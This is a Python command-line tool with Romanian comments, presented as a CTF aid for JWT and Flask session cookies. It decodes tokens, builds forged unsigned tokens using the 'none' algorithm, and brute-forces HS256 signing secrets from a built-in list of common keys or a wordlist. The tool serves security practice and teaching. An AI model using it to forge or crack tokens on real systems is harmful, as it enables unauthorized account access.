#!/usr/bin/env python3
"""
CTF JWT & Session Cookie Inspector / Tamper Tool
Suportă:
- Decodare completă JWT (Header, Payload, Sign) fără cheie privată
- Verificare atac 'none' algorithm
- Brute-force HMAC secret (HS256) cu listă de secrete comune
- Decodare sesiune Flask / itsdangerous (partea de date)
- Decodare cookie-uri Base64 / JSON
"""

import sys
import base64
import json
import hmac
import hashlib
import argparse

COMMON_SECRETS = [
    "secret", "secret123", "password", "123456", "admin", "jwt", "key",
    "supersecret", "token", "test", "development", "production", "default",
    "coxterman", "algolymp", "algocyber", "invatacyber"
]

def base64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem > 0:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def decode_jwt(token: str):
    parts = token.strip().split('.')
    if len(parts) != 3:
        print("[-] Format JWT invalid! (trebuie să aibă 3 părți separate prin punct)")
        return

    header_b64, payload_b64, sig_b64 = parts

    try:
        header = json.loads(base64url_decode(header_b64).decode('utf-8'))
        payload = json.loads(base64url_decode(payload_b64).decode('utf-8'))
    except Exception as e:
        print(f"[-] Eroare la decodare JSON: {e}")
        return

    print("\n" + "="*50)
    print("📋 [JWT HEADER]:")
    print(json.dumps(header, indent=2))
    print("\n📦 [JWT PAYLOAD]:")
    print(json.dumps(payload, indent=2))
    print(f"\n🔑 [SIGNATURE HASH]: {sig_b64}")
    print("="*50 + "\n")

    # None algorithm check
    header_none = dict(header)
    header_none["alg"] = "none"
    forged_none = f"{base64url_encode(json.dumps(header_none).encode())}.{payload_b64}."
    print(f"[*] Payload test 'none' algorithm (fără semnătură):\n{forged_none}\n")

def crack_jwt_secret(token: str, wordlist_file: str = None):
    parts = token.strip().split('.')
    if len(parts) != 3:
        print("[-] JWT invalid.")
        return

    header_b64, payload_b64, sig_b64 = parts
    signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')

    secrets = COMMON_SECRETS
    if wordlist_file:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            secrets = [line.strip() for line in f if line.strip()]

    print(f"[*] Testare {len(secrets)} posibile chei secrete HMAC-SHA256...")

    for secret in secrets:
        computed_sig = hmac.new(secret.encode('utf-8'), signing_input, hashlib.sha256).digest()
        computed_b64 = base64url_encode(computed_sig)
        if computed_b64 == sig_b64:
            print(f"\n[+] 🎉 CHEIE SECRETĂ GĂSITĂ: '{secret}'")
            return secret

    print("[-] Cheia secretă nu a fost găsită în lista testată.")
    return None

def decode_flask_session(cookie_str: str):
    """Extrage payload-ul JSON dintr-un cookie de sesiune Flask."""
    cookie = cookie_str.strip()
    if cookie.startswith("."):
        cookie = cookie[1:]
    parts = cookie.split(".")
    try:
        raw = base64url_decode(parts[0])
        import zlib
        try:
            # Poate fi comprimat cu zlib dacă începe cu '.'
            raw = zlib.decompress(raw)
        except Exception:
            pass
        data = json.loads(raw.decode('utf-8', errors='ignore'))
        print("\n🐍 [FLASK SESSION DATA]:")
        print(json.dumps(data, indent=2))
        print("")
    except Exception as e:
        print(f"[-] Nu s-a putut decoda sesiunea Flask: {e}")

def main():
    parser = argparse.ArgumentParser(description="CTF JWT & Session Cookie Inspector")
    parser.add_argument("token", help="JWT token sau cookie string")
    parser.add_argument("--crack", action="store_true", help="Încearcă spargerea cheii HMAC (HS256)")
    parser.add_argument("--wordlist", help="Fișier wordlist pentru chei secrete")
    parser.add_argument("--flask", action="store_true", help="Tratează stringul ca sesiune Flask")

    args = parser.parse_args()

    if args.flask:
        decode_flask_session(args.token)
    else:
        decode_jwt(args.token)
        if args.crack:
            crack_jwt_secret(args.token, args.wordlist)

if __name__ == "__main__":
    main()
